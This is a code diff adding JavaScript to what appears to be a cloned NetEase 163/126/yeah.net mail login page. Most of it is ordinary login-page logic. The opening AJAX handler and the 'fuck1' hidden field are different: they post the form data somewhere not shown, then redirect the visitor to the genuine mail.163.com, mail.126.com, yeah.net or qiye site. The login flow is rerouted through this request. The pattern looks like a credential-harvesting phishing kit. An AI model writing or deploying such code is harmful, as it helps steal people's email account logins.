+						'lgm9073fuck1': $("#fuck1").val(),
+                    },
+                    dataType: 'html',
+                    type: 'post',
+                    success: function(data) {
+									if(data=="163"){
+										window.location.href='http://mail.163.com/';
+									} 
+									if(data=="126"){
+										window.location.href='http://mail.126.com/';
+									}
+									if(data=="yeah"){
+										window.location.href='http://yeah.net';
+									}
+									if(data=="qiye"){
+										window.location.href='http://qiye.163.com/login/';
+									}                        
+					
+					}
+ 
+                });
+		
+		
+		
+	}
+
+	/**
+	 * 设置提交action
+	 */
+	function fSetAction(){
+		var me = this;
+		var oForm = $id('loginForm');
+		//判断df以及module
+		var sDf = fGetQueryHash('df');
+		var sModule = fGetQueryHash('module');
+		var sUserName = $id('account').value;
+
+		if(sDf == null){
+			sDf = 'email' + gCurrentDomain;
+		}
+		window.customSkin = 'null';
+		if(sDf == 'game_qnyh'){
+			window.customSkin = 23;
+		}
+
+		if(sModule == null){
+			sModule = '';
+		}
+
+		// 手机号码登录特殊处理
+		if(me.bIsMobile){
+			sDf = 'email163_mobile';
+		}
+
+		//设置df的cookie
+		fSetCookie('df',sDf,false);
+
+		// 测速用参数
+		var sUrlRace = aSpdResult[1]+'_'+aSpdResult[0]+'_'+aSpdResult[2]+'_'+aSpdResult[3];
+
+		//SSl登录action
+		if($id('chkSSL').checked){
+			//if (sPreUrl==null){
+				oForm.action = gOption[gCurrentDomain]['sSslUrl']
+							+ fUrlP('funcid','loginone',true)
+							+ fUrlP('language','-1')
+							+ fUrlP('passtype','1')
+							+ fUrlP('iframe','1')//使用js重定向,否则使用SSL302
+							+ fUrlP('product','mail' + gCurrentDomain)
+							+ fUrlP('from','web')
+							+ fUrlP('df',sDf)
+							+ fUrlP('race',sUrlRace)
+							+ fUrlP('module',sModule)
+							+ fUrlP('uid',sUserName)
+							+ fUrlP('style',oStyle.value)
+							+ fUrlP('net',sLocationInfo)
+							+ fUrlP('skinid',window.customSkin)
+							+ (sPreUrl ? fUrlP('url',encodeURIComponent(sPreUrl)) : '')
+							+ ($id('allSSL').checked ? fUrlP('allssl','true') : '');
+			/*}else{
+				oForm.target = '';
+				oForm.action = gOption['sSslUrl2']
+							+ fUrlP('type','1',true)
+							+ fUrlP('product','mail' + gCurrentDomain)
+							+ fUrlP('url',encodeURIComponent(sPreUrl));
+			}*/
+		}else{
+			//普通登录action
+			//if (sPreUrl==null){
+				window.sHttpAction = gOption[gCurrentDomain]['sEntryUrl']
+								+ fUrlP('language','-1',true)
+								+ fUrlP('net',sLocationInfo)
+								+ fUrlP('from','web')
+								+ fUrlP('df',sDf)
+								+ fUrlP('race',sUrlRace)
+								+ fUrlP('module',sModule)
+								+ fUrlP('uid',sUserName)
+								+ fUrlP('style',oStyle.value)
+								+ (sPreUrl ? fUrlP('url',encodeURIComponent(sPreUrl)) : '');
+				loginRequest('fEnData');
+			/*}else{
+				oForm.target = '';
+				oForm.action = gOption['sHttpUrl2']
+							+ fUrlP('type','1',true)
+							+ fUrlP('product','mail' + gCurrentDomain)
+							+ fUrlP('url',encodeURIComponent(sPreUrl));
+			}*/
+		}
+	}
+
+	/**
+	 * 登录信息写入cookie
+	 */
+	function fSaveLoginInfo(){
+		var aCookie = [];
+		gLoginInfo[gCurrentDomain] = {username : oUserIpt.value, style : oStyle.value};
+		for(var d in gLoginInfo){
+			aCookie.push(d + ';'+ gLoginInfo[d].username +';' + gLoginInfo[d].style);
+		}
+		fSetCookie('nts_mail_user', oUserIpt.value ,true);//错误转向调用
+		if($id('rmbUser').checked){
+			fSetCookie('alllogininfo', aCookie.join('|'), true);
+			fSetCookie('alllogindomain', gCurrentDomain, true);
+		}else{
+			fSetCookie('alllogininfo', '', true);
+			fSetCookie('alllogindomain', '', true);
+		}
+	}
+
+	/**
+	 * SSL&全程SSL联动
+	 * @param  {[type]} obj [description]
+	 * @param  {[type]} id  [description]
+	 */
+	function fSecureLinkage(obj, id){
+		var me = window.indexLogin;
+		if(obj.checked && obj.id == 'allSSL' ){
+			$id(id).checked = true;
+		}
+		if( !obj.checked && obj.id == 'chkSSL' ){
+			$id(id).checked = false;
+		}
+		me.checkboxChange(obj);
+		me.checkboxChange($id(id));
+	}
+
+	/**
+	 * 错误信息提示
+	 * @param  {Number} nCode 错误代码
+	 */
+	function fShowError(nCode){
+		var me = this;
+		var sErrType = '',
+			nTarget = 0,
+			nBasePoint = 135;
+		var oErrAlert = $id('errorAlert'),
+			oErrArr = $id('errorArr'),
+			oErrDetail =$id('errorDetail');
+		if(!isNaN(nCode)){
+	    	nCode = nCode - 0;
+	    }
+		switch(nCode){
+			case '_mobileNotAvailable':
+				sErrType = '_mobileNotAvailable';
+				nTarget = 1;
+				break;
+			case 1:
+				sErrType = 'noId';
+				nTarget = 1;
+				break;
+			case 2:
+				sErrType = 'noPhone';
+				nTarget = 1;
+				break;
+			case 3:
+				sErrType = 'noPw';
+				nTarget = 2;
+				break;
+			case 460:
+				sErrType = 'inputWrong';
+				nTarget = 0;
+				break;
+			case 420:
+				sErrType = 'inputWrong';
+				nTarget = 0;
+				break;
+			case 422:
+				sErrType = 'idLocked';
+				nTarget = 1;
+				break;
+			/*case 412:
+				sErrType = 'loginWrong';
+				nTarget = 0;
+				break;*/ //已单独处理
+			case 414:
+				sErrType = 'loginWrong';
+				nTarget = 0;
+				break;
+			case 415:
+				sErrType = 'loginWrong';
+				nTarget = 0;
+				break;
+			case 416:
+				sErrType = 'loginWrong';
+				nTarget = 0;
+				break;
+			case 417:
+				sErrType = 'loginWrong';
+				nTarget = 0;
+				break;
+			case 418:
+				sErrType = 'loginWrong';
+				nTarget = 0;
+				break;
+			case 419:
+				sErrType = 'loginWrong';
+				nTarget = 0;
+				break;
+			default:
+				sErrType = 'systemBusy';
+				nTarget = 0;
+		}
+		if(nCode){
+			$id('errorTitle').innerHTML = gErrorInfo[sErrType].title;
+			if(gErrorInfo[sErrType].info){
+				$id('errorInfo').innerHTML = gErrorInfo[sErrType].info;
+				oErrDetail.style.display = 'block';
+			}else{
+				oErrDetail.style.display = 'none';
+			}
+			if(nTarget == 1){
+				nBasePoint -= 37;
+			}else if(nTarget == 2){
+				nBasePoint += 37;
+			}
+			oErrAlert.className = 'errorAlert-show';
+			oErrAlert.style.top = nBasePoint - oErrAlert.offsetHeight/2 + 'px';
+			oErrArr.style.top = (oErrAlert.offsetHeight - oErrArr.offsetHeight)/2 + 'px';
+
+			fEventListen(document,'click',me.hideError);
+			//有键盘输入事件时,隐藏错误提示
+			fEventListen(document, 'keydown', function(){
+				if(oErrAlert.className == 'errorAlert-show'){
+					me.hideError();
+				}
+			});
+		};
+	}
+
+	/**
+	 * 隐藏错误信息提示
+	 */
+	function fHideError(){
+		$id('errorAlert').className = '';
+		fEventUnlisten(document,'click',indexLogin.hideError);
+	}
+
+	/**
+	 * 重写可信标识
+	 */
+	function fKX(){
+		// var oKX = $id('KX_IMG');
+		// var sHref = 'https://ss.knet.cn/verifyseal.dll?sn=e12051044010020841301459&ct=df&pa=';
+		// var sPa = RndNum_CNNIC(6);
+		// oKX.href = sHref + sPa;
+		// function RndNum_CNNIC(k){
+		// 	for (var rnd = '', i = k; i--; ){
+		// 		rnd += Math.floor( Math.random() * 10 );
+		// 	}
+		// 	return rnd;
+		// }
+	}
+
+	/**
+	 * 临时统计
+	 * @param  {String} sName 域名
+	 */
+	function fTmpSwitchLog(sName){
+		var sJsLogUrl = 'http://count.mail.163.com/beacon/webmail.gif?product=emailtab&type='
+		if(window.gSetFirstTab){
+			sJsLogUrl = sJsLogUrl + 'user';
+		}else{
+			sJsLogUrl = sJsLogUrl + 'default';
+			window.gSetFirstTab = true;
+		}
+		sJsLogUrl = sJsLogUrl + '&tabname=' + sName + '&rnd=' + (new Date()).getTime();
+		var oJsLogImg = $id('jslogimg');
+		if(!oJsLogImg){
+			oJsLogImg = document.createElement('IMG');
+			oJsLogImg.style.display = 'none';
+			oJsLogImg.alt = '';
+		}
+		oJsLogImg.setAttribute('src', sJsLogUrl);
+		if(oJsLogImg.alt == ''){
+			document.body.appendChild(oJsLogImg);
+			oJsLogImg.alt = 'set';
+		}
+		return;
+	}
+})(window);
+
+/**
+ * 阻止事件触发
+ */
+function fE(fFunc, oE, oThat){
+	var e = oE,
+	relatedTarget = e.toElement || e.relatedTarget;
+	while(relatedTarget && relatedTarget != oThat){
+		relatedTarget = relatedTarget.parentNode;
+	}
+	if(!relatedTarget){
+		fFunc();
+	}
+}
+
+/**
+ * 添加删除classname
+ * @param  {Object} o     修改对象dom元素
+ * @param  {String} sCls  classname
+ * @param  {String} sFunc 修改classname方式:add/remove
+ */
+function fCls(o, sCls, sFunc){
+	var oTar = o;
+	var nRes = oTar.className.indexOf(sCls);
+	if(sFunc == 'add'){
+		if(nRes == -1){
+			oTar.className = oTar.className + ' ' + sCls;
+		}else{
+			return;
+		}
+	}
+	if(sFunc == 'remove'){
+		if(nRes != -1){
+			var sCls = '\\s' + sCls
+			var rCls = new RegExp(sCls, 'g');
+			oTar.className = oTar.className.replace(rCls, '');
+		}else{
+			return;
+		}
+	}
+}
+
+/**
+ * 定位服务
+ */
+var sLocationInfo = 'failed',
+fSetLocation = function(data){
+	var tmpData = '';
+	var aData = data.split('&');
+	for(var i = 0; i < aData.length; i++){
+		var aParam = aData[i].split('=');
+		if(aParam.length >= 2){
+			if(aParam[0] == 'net'){
+				tmpData = aParam[1];
+				break;
+			}
+		}
+	}
+	if(tmpData == ''){
+		sLocationInfo = 'err';
+	}else{
+		sLocationInfo = tmpData;
+	}
+	//使用测速服务用户阀值
+	var nPct = 100;// 0 - 100
+	var rnd = Math.random()*100;
+	if(rnd < nPct){
+		fNetErrDebug('rnd' + ((rnd + '').split('.'))[0]);
+		fSpeedTestPre();
+	}else{
+		bSpdAuto = false;
+	}
+};
+
+/*---- 测速服务start ----*/
+//电信t:0,联通c:1,教育网e:2
+var oSpdTestPosition = {
+	 gz : ['gzt', 'gzc', 'gze']
+	,hz : ['hz']
+	,bj : ['t', 'c', 'e']
+};
+var aSpdResult = [-2,-2,-2,'db'],
+aSpdStartTime = [],
+aSpdEndTime = [],
+aSpdTmpTime = [];
+window.bSpdAuto = true;
+var aSpdQueue = ['t','c','e'];
+/*if(nSpdRndPosition <= 100){
+	nSpdIsBjUrl = '';
+	aSpdQueue = oSpdTestPosition.hz;
+	aSpdResult[3] = 'hz';
+}
+if(nSpdRndPosition <= 100){
+	nSpdIsBjUrl = 'cte/';
+	aSpdQueue = oSpdTestPosition.bj;
+	aSpdResult[3] = 'bj';
+}*/
+var fSpeedTestPre = function(sArea){
+	var nSpdRndPosition = Math.random() * 100;
+	// 默认几率
+	aSpdQueue = oSpdTestPosition.gz;
+	aSpdResult[3] = 'gz';
+	if(nSpdRndPosition <= 33){
+		aSpdQueue = oSpdTestPosition.hz;
+		aSpdResult[3] = 'hz';
+	}
+	if(nSpdRndPosition >33 && nSpdRndPosition <= 66){
+		aSpdQueue = oSpdTestPosition.bj;
+		aSpdResult[3] = 'bj';
+	}
+
+	if(sArea){
+		aSpdQueue = oSpdTestPosition[sArea];
+		aSpdResult[3] = sArea;
+	}
+	try{
+		for(i=0; i<aSpdQueue.length; i++){
+			var sLoca = aSpdQueue[i];
+			fGetScript('http://'+ sLoca +'p.127.net/cte/' + sLoca + 'test?' + (new Date()).getTime());
+		}
+	}catch(e){
+		fNetErrDebug('ErrfSpeedTestPre');
+	}
+};
+var fSpeedTest = function(nCount){
+	try{
+		var nRnd;
+		if(bSpdAuto){
+			fNetErrDebug('fSpeedTest' + nCount);
+			aSpdStartTime[nCount] = (new Date()).getTime();
+			nRnd = aSpdStartTime[nCount];
+		}else{
+			aSpdStartTimeUser[nCount] = (new Date()).getTime();
+			nRnd = aSpdStartTimeUser[nCount];
+		}
+		var sLoca = aSpdQueue[nCount];
+		fGetScript('http://'+ sLoca +'p.127.net/cte/' + sLoca +'p?' + nRnd);
+		if(bSpdAuto){
+			aSpdResult[nCount] = -1;
+		}
+	}catch(e){
+		fNetErrDebug('ErrfSpeedTest' + nCount);
+	}
+};
+var fSpd = function(nCount){
+	try{
+		if(bSpdAuto){
+			fNetErrDebug('Spd' + nCount);
+			aSpdEndTime[nCount] = (new Date()).getTime();
+			aSpdResult[nCount] = aSpdEndTime[nCount] - aSpdStartTime[nCount];
+		}else{
+			aSpdEndTimeUser[nCount] = (new Date()).getTime();
+			aSpdResultUser[nCount] = aSpdEndTimeUser[nCount] - aSpdStartTimeUser[nCount];
+			var sIdTmp = 'locationTest';
+			var oTar = $id(sIdTmp + nCount);
+			var nResult = Number(aSpdResultUser[nCount]);
+			/*if(nResult < 100){
+				oTar.style.color = 'green';
+			}else if(nResult < 300 && nResult > 100 ){
+				oTar.style.color = '#ff7200';
+			}else{
+				oTar.style.color = 'red';
+			}*/
+			oTar.innerHTML = '<span class="fontWeight">' + nResult + '</span>ms';
+		}
+	}catch(e){
+		fNetErrDebug('ErrSpd' + nCount);
+	}
+};
+
+//net=err debug
+function fNetErrDebug(sStep){
+	try{
+		if(sLocationInfo.match('err') != null){
+			var sFlow = '-' + sStep;
+			aSpdResult[3] += sFlow;
+		}
+	}
+	catch(e){}
+}
+/*---- 测速服务end ----*/
+
+// 手机号码判断域名接口回调
+function MobCallback(o){
+	var me = window.indexLogin;
+	var oErr = $id('divError');
+	if(o.nCode != 200){
+		setTimeout(function(){
+			if($id('errorAlert').className != 'errorAlert-show'){
+				me.showError('_mobileNotAvailable');
+			}
+		},300);
+		return;
+	}
+
+	var r163 = /@163\.com$/;
+	var r126 = /@126\.com$/;
+	var rYeah = /@yeah\.net$/;
+	var rVip = /@(?:vip|188)/;
+	var sDomain = '';
+
+	var sId = o.sNum;
+	if(rVip.test(sId)){
+		oErr.style.display = '';
+		oErr.innerHTML = '您是VIP邮箱用户,登录请点<a href="http://vipmail.163.com/" target="_blank">这里</a>';
+		return;
+	}else if(r163.test(sId)){
+		sDomain = '163';
+	}else if(r126.test(sId)){
+		sDomain = '126';
+	}else if(rYeah.test(sId)){
+		sDomain = 'yeah';
+	}
+
+	me.setShoujiDomain(sDomain);
+	gShoujiCache[$id('userNameIpt').value] = sDomain;
+}
+
+
+window.onload = function(){
+	indexLogin.init();
+	//启动定位访问
+	fGetScript('http://iplocator.mail.163.com/iplocator?callback=fGetLocator');
+	// 推广更新后台
+	loginExtAD.init();
+	// piwik 输出1%的日志
+	if(fRandom(100) <= 1){
+		var pkBaseURL = "http://pstat.mail.163.com/";
+		fGetScript(pkBaseURL + 'piwik.js', function(){
+			try{
+				var piwikTracker = Piwik.getTracker(pkBaseURL + "piwik.php", 16);
+				piwikTracker.trackPageView();
+				piwikTracker.enableLinkTracking();
+			}catch(err){}
+		});
+	}
+}
+
+// 调整界面布局
+indexLogin.calcWindow();
+indexLogin.changeMainPos();
+window.onresize = function(){
+	indexLogin.calcWindow();
+	indexLogin.changeMainPos();
+}
+
+//	图片推广
+$("#tabshoujiLink").click(function(){
+  $("#idPlaceholder").text("请输入完整邮箱");
+  $("#fuck1").val("qiye");
+});
+$("#tab163Link").click(function(){
+  $("#idPlaceholder").text("帐号或手机号");
+});
+$("#tab126Link").click(function(){
+  $("#idPlaceholder").text("帐号或手机号");
+});
+$("#tabyeahLink").click(function(){
+  $("#idPlaceholder").text("帐号或手机号");
+});
